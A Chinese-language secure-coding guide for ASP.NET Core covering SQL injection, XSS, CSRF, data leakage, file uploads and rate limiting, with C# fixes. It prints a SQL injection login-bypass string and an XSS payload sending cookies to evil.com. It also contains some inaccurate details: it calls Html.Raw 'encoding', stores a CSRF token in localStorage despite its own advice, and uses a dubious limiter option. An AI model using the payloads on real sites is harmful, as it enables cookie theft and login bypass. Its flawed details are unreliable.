## 问题1：如何防止 SQL 注入？

### 问题描述
用户输入被直接拼接到SQL语句中，导致恶意代码执行。

### 攻击示例

```csharp
// ❌ 危险：字符串拼接（易受SQL注入）
string sql = $"SELECT * FROM Users WHERE Name = '{userName}' AND Password = '{password}'";
// 输入: ' OR 1=1 --
// 实际执行: SELECT * FROM Users WHERE Name = '' OR 1=1 --' AND Password = ''
```

### 解决方案

#### 方法1：使用参数化查询（ORM自动处理）
```csharp
// ✅ 安全：EF Core 参数化查询
var user = await _dbContext.Users
    .Where(u => u.Name == userName && u.Password == passwordHash)
    .FirstOrDefaultAsync();
// EF Core 自动生成参数化 SQL：
// SELECT * FROM Users WHERE Name = @p0 AND Password = @p1

// ✅ 安全：Dapper 参数化查询
using var connection = new SqlConnection(connectionString);
var user = connection.QueryFirstOrDefault<User>(
    "SELECT * FROM Users WHERE Name = @Name AND Password = @Password",
    new { Name = userName, Password = passwordHash });
```

#### 方法2：使用存储过程（额外防护层）
```sql
CREATE PROCEDURE sp_GetUserByName
    @Name NVARCHAR(100),
    @PasswordHash NVARCHAR(256)
AS
BEGIN
    SET NOCOUNT ON;
    SELECT * FROM Users WHERE Name = @Name AND Password = @PasswordHash;
END
```

```csharp
// 调用存储过程（同样使用参数化）
var result = await _dbContext.Users
    .FromSqlRaw("EXEC sp_GetUserByName @p0, @p1", userName, passwordHash)
    .ToListAsync();
```

#### 方法3：输入验证 + 最小权限原则
```csharp
// 验证输入格式
if (!Regex.IsMatch(userName, @"^[a-zA-Z0-9_]{2,50}$"))
{
    throw new ArgumentException("Invalid username format");
}

// 数据库用户只给必要权限（不使用sa/root）
// 应用程序账号：仅 SELECT/INSERT/UPDATE/DELETE 特定表
```

## 问题2：如何防御 XSS（跨站脚本攻击）？

### 攻击示例

```html
<!-- 恶意脚本注入到页面中 -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

<!-- 或通过HTML属性 -->
<img src=x onerror="alert('XSS')">
```

### 解决方案

```csharp
// 1. Razor 自动编码（默认行为）
@Model.UserInput  <!-- 默认进行 HTML 编码 -->

// 2. 显式编码
@Html.Raw(Model.TrustedContent)  // 仅对可信内容使用！

// 3. CSP (Content Security Policy) 头
app.UseCsp(options => options
    .DefaultSources(s => s.AllowSelf())
    .StyleSources(s => s.AllowSelf())
    .ScriptSources(s => s.AllowSelf())
    .FrameAncestors(s => s.AllowSelf()));

// 4. 设置响应头
app.Use(async (context, next) =>
{
    context.Response.Headers["X-Content-Type-Options"] = "nosniff";
    context.Response.Headers["X-Frame-Options"] = "DENY";
    context.Response.Headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self'";
    context.Response.Headers["X-XSS-Protection"] = "1; mode=block";
    
    await next();
});
```

## 问题3：CSRF Token 验证失败

### 解决方案

```csharp
// Program.cs - 启用CSRF
builder.Services.AddAntiforgery(options =>
{
    options.HeaderName = "X-CSRF-TOKEN";
    options.Cookie.Name = "__Host-MyApp.Csrf";
    options.Cookie.SameSite = SameSiteMode.Strict;
    options.SlidingExpiration = true;  // 滑动过期时间
});

var app = builder.Build();
app.UseAntiforgery();  // 中间件验证Token

// API Controller中使用
[ApiController]
[Route("api/[controller]")]
[AutoValidateAntiforgeryToken]  // 类级别启用
public class OrderController : ControllerBase
{
    [HttpPost]
    public async Task<IActionResult> Create([FromBody] CreateOrderDto dto)
    {
        // Token由中间件自动验证
        return Ok(await _orderService.CreateAsync(dto));
    }
}
```

```typescript
// 前端获取并附加CSRF Token
async function getCsrfToken() {
    const response = await fetch('/api/csrf-token');
    const { token } = await response.json();
    
    // 存储token供后续请求使用
    localStorage.setItem('csrf_token', token);
}

// 在请求头中发送
fetch('/api/orders', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'RequestVerificationToken': localStorage.getItem('csrf_token')
    },
    body: JSON.stringify(orderData)
});
```

## 问题4：敏感信息泄露防护

### 常见泄露场景及修复

| 场景 | 错误做法 | 正确做法 |
|------|---------|---------|
| 日志记录密码 | `_logger.Info($"Password: {password}")` | 永远不要记录敏感信息 |
| 异常信息暴露 | `throw ex` 包含连接串 | 自定义异常消息 |
| Git提交密钥 | `.env` 文件被提交 | 使用 `.gitignore` 和 Secret Manager |
| API返回完整实体 | `return Ok(user)` 含密码哈希 | 使用 DTO 投影 |
| 前端存储Token | localStorage存JWT | 使用HttpOnly Cookie |
| 错误页面显示堆栈 | 生产环境显示详细错误 | 自定义错误页 |

```csharp
// 敏感数据脱敏工具
public static class SensitiveDataHelper
{
    public static string MaskEmail(string email)
    {
        if (string.IsNullOrEmpty(email)) return "***";
        var atIndex = email.IndexOf('@');
        return atIndex > 0 
            ? $"{email[..2]}***{email[atIndex..]}" 
            : "***";
    }

    public static string MaskPhone(string phone)
    {
        if (string.IsNullOrEmpty(phone) || phone.Length < 7) return "***";
        return $"{phone[..3]}****{phone[^4..]}";
    }

    public static string MaskConnectionString(string connStr)
    {
        // 移除密码部分
        return Regex.Replace(connStr, "(?<=Password=)[^;]*", "***");
    }
}
```

## 问题5：文件上传安全

### 攻击类型与防护

```csharp
public class SecureFileUploadService
{
    private readonly ILogger<SecureFileUploadService> _logger;
    private readonly IWebHostEnvironment _env;

    private static readonly HashSet<string> AllowedExtensions = new()
    { ".jpg", ".jpeg", ".png", ".gif", ".pdf", ".docx" };
    
    private const long MaxFileSize = 10 * 1024 * 1024; // 10MB

    public async Task<UploadResult> UploadAsync(IFormFile file, string subdirectory)
    {
        // 1. 验证文件不为空
        if (file == null || file.Length == 0)
            return UploadResult.Failure("未选择文件");

        // 2. 验证文件大小
        if (file.Length > MaxFileSize)
            return UploadResult.Failure("文件大小超过限制（最大10MB）");

        // 3. 验证扩展名
        var extension = Path.GetExtension(file.FileName).ToLowerInvariant();
        if (!AllowedExtensions.Contains(extension))
            return UploadResult.Failure("不允许的文件类型");

        // 4. 验证MIME类型（不能仅依赖扩展名）
        var allowedMimeTypes = new[] { "image/jpeg", "image/png", "image/gif", "application/pdf" };
        if (!file.ContentType.StartsWith("image/") && !allowedMimeTypes.Contains(file.ContentType.ToLowerInvariant()))
        {
            _logger.LogWarning("可疑的MIME类型: {MIME} for file: {File}", file.ContentType, file.FileName);
            return UploadResult.Failure("文件内容与声明的类型不符");
        }

        // 5. 重命名文件（防止路径穿越和覆盖）
        var safeFileName = $"{Guid.NewGuid():N}{extension}";
        
        // 6. 生成安全的存储路径（不在URL中暴露原始文件名）
        var uploadPath = Path.Combine(_env.WebRootPath, "uploads", subdirectory);
        
        Directory.CreateDirectory(uploadPath);

        var filePath = Path.Combine(uploadPath, safeFileName);

        // 7. 复制文件（使用新流避免路径穿越攻击）
        await using var stream = new FileStream(filePath, FileMode.Create);
        await file.CopyToAsync(stream);

        // 8. 扫描病毒（可选，企业环境推荐）
        // await _clamAvService.ScanAsync(filePath);

        _logger.LogInformation("文件上传成功: {File} → {Path}", file.FileName, safeFileName);

        return UploadResult.Success($"/uploads/{subdirectory}/{safeFileName}");
    }
}
```

## 问题6：速率限制配置

```csharp
// Program.cs
builder.Services.AddRateLimiter(rateLimiterOptions =>
{
    rateLimiterOptions.RejectionStatusCode = StatusCodes.Status429TooManyRequests;
    
    // 固定窗口限流
    rateLimiterOptions.AddPolicy("FixedWindow", httpContext =>
        RateLimitPartition.GetFixedWindowLimiter(
            partitionKey: httpContext.Connection.RemoteIpAddress?.ToString() ?? "unknown",
            permitLimit: 100,
            window: TimeSpan.FromMinutes(1)));
    
    // 滑动窗口限流
    rateLimiterOptions.AddPolicy("SlidingWindow", httpContext =>
        RateLimitPartition.GetSlidingWindowLimiter(
            partitionKey: httpContext.User?.Identity?.Name ?? "anonymous",
            permitLimit: 20,
            window: TimeSpan.FromMinutes(1),
            segmentsPending: 1));
    
    // 登录接口特殊限流
    rateLimiterOptions.AddPolicy("LoginRateLimit", httpContext =>
        RateLimitPartition.GetFixedWindowLimiter(
            partitionKey: httpContext.Connection.RemoteIpAddress?.ToString() ?? "unknown",
            permitLimit: 5,
            window: TimeSpan.FromMinutes(15)));
});

var app = builder.Build();

// 全局限流
app.UseRateLimiter();

// 控制器或Action级别限流
```

## 总结

| 安全威胁 | 防御措施 | ASP.NET Core 内置支持 |
|----------|----------|-------------------|
| SQL 注入 | ORM参数化、最小权限 | EF Core / Dapper |
| XSS | 输出编码、CSP | Razor 自动编码 |
| CSRF | Antiforgery Token | AddAntiforgery() |
| 敏感信息泄露 | DTO投影、日志过滤 | Data Protection API |
| 文件上传漏洞 | 白名单、重命名、扫描 | IFormFile 验证 |
| 越权访问 | 授权策略、RBAC | [Authorize] 属性 |
| 弱密码 | 密码策略验证 | Identity PasswordValidator |
| 速率限制 | 令牌桶/固定窗口 | Rate Limiter Middleware |

**安全原则**：
1. **永远不要信任用户输入**：验证、清理、编码
2. **纵深防御**：多层安全控制
3. **最小权限原则**：数据库账号、文件系统权限
4. **安全左移**：设计阶段考虑安全而非事后补救
5. **定期安全审计**：OWASP ZAP 扫描、渗透测试
